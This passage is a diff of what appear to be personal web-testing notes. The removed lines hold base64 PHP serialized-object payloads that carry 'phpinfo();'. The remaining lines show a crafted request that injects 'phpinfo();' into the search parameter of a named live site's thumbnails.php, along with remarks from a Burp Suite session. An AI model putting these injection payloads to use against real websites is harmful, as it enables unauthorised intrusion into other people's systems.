@@ -16,25 +16,14 @@ a:4:{s:2:"ID";s:32:"951fdb78b218306fdb443eceac29664d";s:2:"am";i:1;s:4:"lang";s:
 
 
 
-payload:
-
-czoxMjM6ImE6NDp7czoyOiJwaHBpbmZvKCk7IjtzOjMyOiJwaHBpbmZvKCk7IjtzOjI6ImFtIjtpOjE7czo0OiJwaHBpbmZvKCk7IjtzOjc6InBocGluZm8oKTsiO3M6MzoicGhwaW5mbygpOyI7YToxOntpOjA7czoxOiIxIjt9fQ%3D%3D
-
-
-
-payload 2:
-czoxMjM6ImE6NDp7czoyOiJwaHBpbmZvKCk7IjtzOjMyOiJwaHBpbmZvKCk7IjtzOjI6InBocGluZm8oKTsiO2k6MTtzOjQ6InBocGluZm8oKTsiO3M6NzoicGhwaW5mbygpOyI7czozOiJwaHBpbmZvKCk7IjthOjE6e2k6MDtzOjE6InBocGluZm8oKTsiO319
-
-s:123:"a:4:{s:2:"phpinfo();";s:32:"phpinfo();";s:2:"phpinfo();";i:1;s:4:"phpinfo();";s:7:"phpinfo();";s:3:"phpinfo();";a:1:{i:0;s:1:"phpinfo();";}}
-
 
 ---
 
-what?
-
+????
 this crafted request appears to respond with a different website. when performed on https://copperplate.org.uk with scope limiting enabled in Burp Suite, sending this request returns a response from https://tech-sourcery.co.uk...
 
-request to https://copperplate.org.uk/thumbnails.php?album=search&keywords=on&search="""";phpinfo();#00
+Note the '#' at the end
+request to https://copperplate.org.uk/thumbnails.php?album=search&keywords=on&search=phpinfo();#
 ```
 GET /thumbnails.php?album=search&keywords=on&search="""";phpinfo();#00 HTTP/2
 Host: copperplate.org.uk
